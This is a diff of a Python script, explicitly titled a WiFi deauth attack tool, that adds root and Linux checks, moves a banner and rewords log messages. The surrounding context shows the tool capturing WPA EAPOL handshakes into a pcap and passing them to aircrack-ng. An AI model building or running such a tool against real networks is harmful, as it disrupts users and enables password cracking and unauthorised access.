@@ -8,7 +8,13 @@ import pcapy
 from scapy.all import *
 from collections import defaultdict
 
-print("\n--- Welcome to WiFi Deauth Attack Script ---")
+if os.geteuid() != 0:
+	print("Нужно запускать от root")
+	sys.exit(1)
+
+if not sys.platform.startswith("linux"):
+	print("Только для linux-систем!")
+	sys.exit(1)
 
 def check_unsigned_int(value):
 	try:
@@ -37,6 +43,8 @@ if args.aircrack_check:
 	if shutil.which('aircrack-ng') is None:
 		print("aircrack-ng не установлен!")
 		sys.exit(1)
+
+print("\n--- Welcome to WiFi Deauth Attack Script ---")
 
 class WiFiDeauth:
 	def __init__(self, interface, bssid, client, channel, deauth_count, pcap_file, aircrack_check, password):
@@ -158,7 +166,7 @@ class WiFiDeauth:
 						print(f"[-] Unknown EAPOL Data!")
 		
 		if (self.current_deauth +1) == self.deauth_count and not self.deauth_done_flag:
-			print("[+] All deauth packets sended, waiting last EAPOL messages")
+			print("[+] All deauth packets sent, waiting EAPOL lasted messages")
 			self.deauth_done_flag = True
 			self.keys_receiving_start_time = time.time()
 		
@@ -168,11 +176,9 @@ class WiFiDeauth:
 			if elapsed_time >= 5:
 				if self.key1_cnt > 0 and self.key2_cnt > 0 and self.key3_cnt > 0 and self.key4_cnt > 0:
 					if not self.all_keys_flag:
-						self.all_keys_flag = True
-						print("[+] All keys received done")
-						
+						self.all_keys_flag = True						
 						wrpcap(self.pcap_file, self.packets)
-						print(f"[+] All {len(self.packets)} packets saved in \"{self.pcap_file}\"")
+						print(f"[+] All keys ({len(self.packets)}) received done. Created \"{self.pcap_file}\"")
 						
 						if self.aircrack_check:
 							print("[+] Running aircrack-ng")
